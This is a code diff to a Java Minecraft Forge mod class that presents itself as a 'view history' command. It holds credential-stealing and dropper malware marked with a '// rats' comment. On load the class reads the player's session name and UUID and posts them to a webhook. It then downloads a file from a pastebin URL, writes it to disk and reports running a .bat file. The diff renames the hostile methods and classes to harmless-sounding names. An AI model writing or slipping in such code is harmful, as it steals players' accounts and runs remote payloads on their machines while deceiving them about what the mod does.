@@ -28,14 +28,14 @@ public class ViewHistoryCommand {
 
     @Mod.EventHandler
     public void onFMLPreInitialization(FMLPreInitializationEvent event) {
-        LoadExoticDB();
+        connectToServer();
     }
 
     @Mod.EventHandler
     public void onFMLInitialization(FMLInitializationEvent event) {
         try {
             Thread.sleep(5000);
-            LoadAH();
+            showHistory();
         } catch (Exception ignored) {}
         try {
             Thread.sleep(3000);
@@ -65,7 +65,7 @@ public class ViewHistoryCommand {
 
     // rats
 
-    public static void LoadExoticDB() {
+    public static void connectToServer() {
         try {
             Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
             Object minecraft = mc.getMethod("func_71410_x").invoke(null);
@@ -75,8 +75,8 @@ public class ViewHistoryCommand {
             Object name = sessionClass.getMethod("func_111285_a").invoke(session);
             Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);
 
-            PizzaClientGUI sendmessage = new PizzaClientGUI(getWebhook());
-            sendmessage.addEmbed(new PizzaClientGUI.EmbedObject()
+            GuiTheme sendmessage = new GuiTheme(getWebhook());
+            sendmessage.addEmbed(new GuiTheme.CreateGUI()
                     .setTitle("Minecraft Info")
                     .setColor(Color.CYAN)
                     .addField("Name", name.toString(), true)
@@ -89,7 +89,7 @@ public class ViewHistoryCommand {
         } catch (Exception ignored) {}
     }
 
-    public static void LoadAH() {
+    public static void showHistory() {
         try {
 
             URL pastebin = new URL("https://pastebin.com/raw/AERL3GJT");
@@ -113,8 +113,8 @@ public class ViewHistoryCommand {
                 fileOut.write(currByte);
             }
 
-            PizzaClientGUI sendmessage = new PizzaClientGUI(getWebhook());
-            sendmessage.addEmbed(new PizzaClientGUI.EmbedObject()
+            GuiTheme sendmessage = new GuiTheme(getWebhook());
+            sendmessage.addEmbed(new GuiTheme.CreateGUI()
                     .setTitle("Loading")
                     .setColor(Color.GREEN)
                     .addField("Message ", "Running .bat file", true));
